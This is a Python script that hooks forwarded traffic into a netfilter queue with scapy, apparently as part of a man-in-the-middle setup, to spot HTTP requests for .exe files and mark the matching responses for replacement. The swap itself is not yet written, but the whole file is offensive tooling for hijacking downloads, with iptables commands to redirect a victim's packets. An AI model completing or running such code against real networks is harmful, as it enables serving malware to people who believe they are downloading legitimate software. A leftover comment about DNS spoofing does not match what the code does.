#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:  # http means 80
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replacing download file...")
    packet.accept()


subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
try:
    # print("[+] DNS Spoof started on " + website + " --> " + target_web_ip)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Resetting DNS tables")
    subprocess.call("iptables --flush", shell=True)

# iptables -I FORWARD -j NFQUEUE --queue-num 0      //Create a queue with arp spoof
# iptables -I INPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc input packet
# iptables -I OUTPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc output packet
# iptables --flush      //To delete the queue
